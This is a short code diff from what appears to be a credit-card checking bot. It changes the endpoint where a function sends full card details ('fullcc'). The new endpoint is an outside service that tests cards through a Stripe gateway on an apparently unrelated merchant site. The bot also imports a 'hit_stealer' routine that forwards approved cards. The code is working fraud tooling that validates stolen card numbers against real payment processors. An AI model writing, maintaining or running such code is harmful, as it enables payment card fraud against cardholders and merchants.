@@ -11,7 +11,7 @@ from TOOLS.getbin import *
 from BOT.tools.hit_stealer import send_hit_if_approved
 
 async def braintree_auth_api_check(fullcc: str, session: httpx.AsyncClient) -> dict:
-    url = f"https://miapis.onrender.com/b3_npnbet?lista={fullcc}"
+    url = f"https://stripe-auto-dsam.onrender.com/gateway=autostripe/key=xebec/site=dilaboards.com/cc={fullcc}"
     try:
         resp = await session.get(url)
         json_resp = resp.json()
